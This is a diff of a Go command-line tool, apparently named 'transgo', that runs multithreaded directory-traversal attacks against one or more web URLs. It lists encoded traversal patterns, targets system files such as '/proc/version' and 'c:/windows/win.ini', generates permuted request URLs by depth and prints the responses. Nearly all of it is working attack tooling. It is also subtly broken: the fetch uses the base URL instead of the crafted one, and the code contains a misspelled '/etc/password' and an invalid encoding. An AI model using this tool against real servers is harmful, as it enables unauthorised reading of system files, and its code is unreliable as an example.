@@ -25,32 +25,123 @@ var banner = `
             ░           ░  ░         ░       ░        ░     ░ ░  
                                                                  
 `
-
-type trans struct {
-	finisher string
-	pattern  string
+var banner = `
+___________                             ________        
+\__    ___/___________    ____   ______/  _____/  ____  
+  |    |  \_  __ \__  \  /    \ /  ___/   \  ___ /  _ \ 
+  |    |   |  | \// __ \|   |  \\___ \\    \_\  (  <_> )
+  |____|   |__|  (____  /___|  /____  >\______  /\____/ 
+                      \/     \/     \/        \/
+`
+// Platform stores platform name ex: linux and a file list usually found on that plaform
+type Platform struct {
+	name  string
+	files []string
 }
 
-var transversalPatterns = []trans{
-	trans{finisher: "", pattern: ".."},
-	trans{finisher: "/", pattern: "../"},
-	trans{finisher: "\\", pattern: "..\\"},
-	trans{finisher: "\\", pattern: "%2e%2e\\"},
-	trans{finisher: "%2f", pattern: "%2e%2e%2f"},
-	trans{finisher: "/", pattern: "%2e%2e/"},
-	trans{finisher: "%2f", pattern: "..%2f"},
-	trans{finisher: "%5c", pattern: "%2e%2e%5c"},
-	trans{finisher: "%5c", pattern: "..%5c"},
-	trans{finisher: "%c1%1c", pattern: "..%c1%1c"},
-	trans{finisher: "%c0%9v", pattern: "..%c0%9v"},
-	trans{finisher: "%c0%af", pattern: "..%c0%af"},
-	trans{finisher: "%c1%9c", pattern: "..%c1%9c"},
-	trans{finisher: "%255c", pattern: "%252e%252e%255c"},
-	trans{finisher: "%255c", pattern: "..%255c"},
+// AttackData stores information of the request and the obtained data
+type AttackData struct {
+	url        string
+	platform   string
+	file       string
+	requestURL string
+	data       string
+	statusCode int
+	pattern    string
 }
 
-func fileToLines(filePath string) (lines []string, err error) {
+var platforms = []Platform{
+	{
+		name: "linux",
+		files: []string{
+			"/proc/version",
+			"/etc/password",
+		},
+	},
+	{
+		name: "windows",
+		files: []string{
+			"c:/windows/win.ini",
+			"c:/windows/system32/drivers/etc/hosts",
+		},
+	},
+}
 
+var patterns = []string{
+	"..",
+	"../",
+	"..\\",
+	"%2e%2e\\",
+	"%2e%2e%2f",
+	"%2e%2e/",
+	"..%2f",
+	"%2e%2e%5c",
+	"..%5c",
+	"..%c1%1c",
+	"..%c0%9v",
+	"..%c0%af",
+	"..%c1%9c",
+	"%252e%252e%255c",
+	"..%255c",
+}
+
+func show(atk AttackData) {
+	fmt.Printf("url: %s\nrequest url: %s\nplatform: %s\nfile: %s\nsize: %d\nstatus code: %d\npattern: %s\n\n\n", atk.url, atk.requestURL, atk.platform, atk.file, len(atk.data), atk.statusCode, atk.pattern)
+}
+
+// IsValidURL Checks URL Validity
+func IsValidURL(toTest string) bool {
+
+	_, err := url.ParseRequestURI(toTest)
+	if err != nil {
+		return false
+	}
+
+	u, err := url.Parse(toTest)
+	if err != nil || u.Scheme == "" || u.Host == "" {
+		return false
+	}
+	return true
+}
+
+// IsValidPlatform checks for platform validity
+func IsValidPlatform(platform string) bool {
+	switch platform {
+	case
+		"all",
+		"linux",
+		"windows":
+		return true
+	}
+	return false
+}
+
+// IsValidThreads checks threadcount validity
+func IsValidThreads(threads int) bool {
+	if threads > 0 {
+		return true
+	}
+	return false
+}
+
+// IsValidDepth checks for depth validity
+func IsValidDepth(depth int) bool {
+	if depth > 0 {
+		return true
+	}
+	return false
+}
+
+// IsValidTimeout checks for timeout validity
+func IsValidTimeout(timeout int) bool {
+	if timeout > 0 {
+		return true
+	}
+	return false
+}
+
+// ReadFile - reads a file onto string array returns [string], err
+func ReadFile(filePath string) (lines []string, err error) {
 	f, err := os.Open(filePath)
 	if err != nil {
 		return []string{}, err
@@ -65,123 +156,93 @@ func fileToLines(filePath string) (lines []string, err error) {
 	return lines, err
 }
 
-func isValidURL(toTest string) bool {
-	_, err := url.ParseRequestURI(toTest)
-	if err != nil {
-		return false
-	}
-
-	u, err := url.Parse(toTest)
-	if err != nil || u.Scheme == "" || u.Host == "" {
-		return false
-	}
-	return true
-}
-
-func isValidPlatform(platform string) bool {
-	switch platform {
-	case
-		"all",
-		"linux",
-		"windows":
-		return true
-	}
-	return false
-}
-
-func isValidThreads(threads int) bool {
-	if threads > 0 {
-		return true
-	}
-	return false
-}
-
-func isValidDepth(depth int) bool {
-	if depth > 0 {
-		return true
-	}
-	return false
-}
-
-func isValidTimeout(timeout int) bool {
-	if timeout > 0 {
-		return true
-	}
-	return false
-}
-
-type resultSet struct {
-	url      string
-	response string
-}
-
-func getURL(baseURL string, httpClient http.Client, requestURL string, c chan resultSet) {
-	resp, err := httpClient.Get(requestURL)
+func getData(atk AttackData, httpClient http.Client, c chan AttackData) {
+	var body string
+	resp, err := httpClient.Get(atk.url)
 	if err == nil && resp.StatusCode == 200 {
 		buf := new(bytes.Buffer)
 		buf.ReadFrom(resp.Body)
-		body := buf.String()
-		result := resultSet{
-			url:      baseURL,
-			response: body,
-		}
-		c <- result
+		body = buf.String()
+		atk.data = body
+		atk.statusCode = resp.StatusCode
 	} else {
-		result := resultSet{
-			url:      baseURL,
-			response: "",
-		}
-		c <- result
+		atk.statusCode = 1
 	}
+	c <- atk
 }
 
-func processList(url string, urlSublist []string, timeoutSeconds int, c chan resultSet) {
+func performAttack(attackSublist []AttackData, timeoutSeconds int, c chan AttackData) {
 	httpClient := http.Client{Timeout: time.Duration(timeoutSeconds) * time.Second}
-	for _, url := range urlSublist {
-		getURL(url, httpClient, url, c)
+	for _, atk := range attackSublist {
+		getData(atk, httpClient, c)
 	}
 }
 
-func generateUrls(url string, platform string, minDepth int, maxDepth int, windowsFiles []string, linuxFiles []string) []string {
-	urlList := []string{}
-	filesToTest := []string{}
-	filesToTestWindowsFormat := []string{}
+func generateURLPermutations(baseURL string, pattern string, depth int, fileName string) []string {
+	var URLlist []string
+	var baseURLlist []string
+	var fileNameList []string
+	if strings.HasSuffix(baseURL, "/") {
+		urlNoslash := strings.TrimSuffix(baseURL, "/")
+		baseURLlist = append(baseURLlist, urlNoslash)
+	}
+	baseURLlist = append(baseURLlist, baseURL)
 
-	for _, winPath := range windowsFiles {
-		newString := strings.Replace(winPath, "/", "\\", -1)
-		filesToTestWindowsFormat = append(filesToTestWindowsFormat, newString)
-		splittedPath := strings.Split(newString, ":")
-		if len(splittedPath) > 0 {
-			filePath := splittedPath[1]
-			filesToTestWindowsFormat = append(filesToTestWindowsFormat, filePath)
-			if strings.HasPrefix(filePath, "/") {
-				filePath := strings.TrimLeft(filePath, "\\")
-				filesToTestWindowsFormat = append(filesToTestWindowsFormat, filePath)
-			}
+	if strings.HasPrefix(fileName, "/") {
+		fileNameList = append(fileNameList, strings.TrimPrefix(fileName, "/"))
+	}
+
+	if strings.HasSuffix(fileName, "/") {
+		fileNameList = append(fileNameList, strings.TrimSuffix(fileName, "/"))
+	}
+
+	if strings.HasPrefix(fileName, "/") && strings.HasSuffix(fileName, "/") {
+		fileNameList = append(fileNameList, strings.TrimPrefix(strings.TrimSuffix(fileName, "/"), "/"))
+	}
+
+	var reverseSlashFileNameList []string
+	for _, f := range fileNameList {
+		reverseSlashFileNameList = append(reverseSlashFileNameList, strings.ReplaceAll(f, "/", "\\"))
+	}
+
+	for _, url := range baseURLlist {
+		for _, fName := range fileNameList {
+			URLlist = append(URLlist, url+strings.Repeat(pattern, depth)+fName)
 		}
 
+		for _, rfName := range reverseSlashFileNameList {
+			URLlist = append(URLlist, url+strings.Repeat(pattern, depth)+rfName)
+		}
 	}
+	return URLlist
+}
 
-	if platform == "all" {
-		filesToTest = append(linuxFiles, windowsFiles...)
-		filesToTest = append(filesToTest, filesToTestWindowsFormat...)
-	} else if platform == "windows" {
-		filesToTest = windowsFiles
-		filesToTest = append(filesToTest, filesToTestWindowsFormat...)
-	} else if platform == "linux" {
-		filesToTest = linuxFiles
-	}
-
-	for _, filePath := range filesToTest {
-		for _, ptrn := range transversalPatterns {
-			var urlToTest string
-			for d := minDepth; d <= maxDepth; d++ {
-				urlToTest = url + ptrn.finisher + strings.Repeat(ptrn.pattern, d) + filePath
-				urlList = append(urlList, urlToTest)
+func generateAttackData(platformList []Platform, urlList []string, patternList []string, minDepth int, maxDepth int) []AttackData {
+	var AttackDataList []AttackData
+	for _, platform := range platformList {
+		for _, url := range urlList {
+			for _, pattern := range patterns {
+				for d := minDepth; d < maxDepth; d++ {
+					for _, file := range platform.files {
+						var requestURLS = generateURLPermutations(url, pattern, d, file)
+						for _, requestURL := range requestURLS {
+							att := AttackData{
+								url:        url,
+								platform:   platform.name,
+								file:       file,
+								requestURL: requestURL,
+								data:       "",
+								statusCode: 0,
+								pattern:    pattern,
+							}
+							AttackDataList = append(AttackDataList, att)
+						}
+					}
+				}
 			}
 		}
 	}
-	return urlList
+	return AttackDataList
 }
 
 func usage() {
@@ -191,55 +252,57 @@ func usage() {
 func main() {
 	fmt.Println(banner)
 
-	windowsFiles, winErr := fileToLines("data/windows.lst")
-	if winErr != nil {
-		fmt.Printf("[E] Missing 'windows.lst'\n")
-		usage()
-		os.Exit(1)
-	}
-
-	linuxFiles, linErr := fileToLines("data/linux.lst")
-	if linErr != nil {
-		fmt.Printf("[E] Missing 'linux.lst'\n")
-		usage()
-		os.Exit(1)
-	}
-
 	url := flag.String("u", "", "url to attack")
-	searchPatern := flag.String("s", "", "only show results that match with this pattern")
+	urlsFile := flag.String("U", "", "file with urls to attack")
 	platform := flag.String("p", "all", "platform to attack (all, linux, windows)")
 	threads := flag.Int("t", 10, "number of threads to use")
 	minDepth := flag.Int("m", 5, "min directory depth to test")
 	maxDepth := flag.Int("d", 15, "max directory depth to test")
 	timeout := flag.Int("to", 5, "timeout in seconds for requests")
-
+	//searchPatern := flag.String("s", "", "only show results that match with this pattern")
+	//pattern := flag.String("P", "", "transversal pattern to use ex: ../")
+	//fileList := flag.String("F", "", "list of files to look for while searching")
 	flag.Parse()
 
-	if !isValidURL(*url) {
+	if *url == "" && *urlsFile == "" {
+		usage()
+		os.Exit(1)
+	}
+
+	if *url != "" && !IsValidURL(*url) {
 		fmt.Printf("[!] The url you entered is invalid!\n")
 		usage()
 		os.Exit(1)
 	}
 
-	if !isValidPlatform(*platform) {
+	if *urlsFile != "" {
+		_, err := os.Open(*urlsFile)
+		if err != nil {
+			fmt.Printf("[!] Could not find '%s'\n", *urlsFile)
+			usage()
+			os.Exit(1)
+		}
+	}
+
+	if !IsValidPlatform(*platform) {
 		fmt.Printf("[!] The platform u've chosen is invalid!\n")
 		usage()
 		os.Exit(1)
 	}
 
-	if !isValidThreads(*threads) {
+	if !IsValidThreads(*threads) {
 		fmt.Printf("[!] The thread count you've entered is invalid!\n")
 		usage()
 		os.Exit(1)
 	}
 
-	if !isValidDepth(*minDepth) {
+	if !IsValidDepth(*minDepth) {
 		fmt.Printf("[!] The min. depth u've entered is invalid!\n")
 		usage()
 		os.Exit(1)
 	}
 
-	if !isValidDepth(*maxDepth) {
+	if !IsValidDepth(*maxDepth) {
 		fmt.Printf("[!] max. depth u've entered is invalid!\n")
 		usage()
 		os.Exit(1)
@@ -251,41 +314,53 @@ func main() {
 		os.Exit(1)
 	}
 
-	if !isValidTimeout(*timeout) {
+	if !IsValidTimeout(*timeout) {
 		fmt.Printf("[!] The timeout u've entered is invalid!\n")
 		usage()
 		os.Exit(1)
 	}
 
-	var urlList = generateUrls(*url, *platform, *minDepth, *maxDepth, windowsFiles, linuxFiles)
-	var sublistSize = (int)(math.Ceil((float64)(len(urlList) / *threads)))
-	fmt.Printf("[+] Running transgo with good luck!!\n")
-	fmt.Printf("[*] URL: %s\n", *url)
-	fmt.Printf("[*] Platform: %s\n", *platform)
-	fmt.Printf("[*] Threads: %d\n", *threads)
-	fmt.Printf("[*] Min, depth: %d Max, depth: %d\n", *minDepth, *maxDepth)
-	fmt.Printf("[*] Request timeout: %d\n\n", *timeout)
-	dataChannels := make(chan resultSet, len(urlList))
+	var urlList []string
 
-	for i := 0; i < *threads; i++ {
-		var urlSublist = urlList[sublistSize*(i) : sublistSize*(i+1)]
-		go func(urlSublist []string) {
-			processList(*url, urlSublist, *timeout, dataChannels)
-		}(urlSublist)
+	if *url != "" {
+		urlList = append(urlList, *url)
 	}
 
-	dataMap := make(map[string]string)
-
-	for i := 0; i < len(urlList); i++ {
-		body := <-dataChannels
-		if strings.Contains(body.response, *searchPatern) {
-			_, found := dataMap[body.response]
-			if found == false {
-				// TODO: save and print the filename that was requested and check if is another url
-				dataMap[body.response] = body.url
-				fmt.Println(body.response)
+	if *urlsFile != "" {
+		urlsFromFile, err := ReadFile(*urlsFile)
+		if err == nil {
+			for i := 0; i < len(urlsFromFile); i++ {
+				urlList = append(urlList, urlsFromFile[i])
 			}
 		}
+	}
+
+	var platformList []Platform
+
+	if *platform == "all" {
+		platformList = platforms
+	} else {
+		for _, plat := range platforms {
+			if plat.name == *platform {
+				platformList = append(platformList, plat)
+			}
+		}
+	}
+
+	var attackDataList = generateAttackData(platformList, urlList, patterns, *minDepth, *maxDepth)
+	var sublistSize = (int)(math.Ceil((float64)(len(attackDataList) / *threads)))
+	dataChannels := make(chan AttackData, len(attackDataList))
+
+	for i := 0; i < *threads; i++ {
+		var attackSubList = attackDataList[sublistSize*(i) : sublistSize*(i+1)]
+		go func(attackSubList []AttackData) {
+			performAttack(attackSubList, *timeout, dataChannels)
+		}(attackSubList)
+	}
+
+	for i := 0; i < len(attackDataList); i++ {
+		atk := <-dataChannels
+		fmt.Println(atk.data)
 	}
 
 }
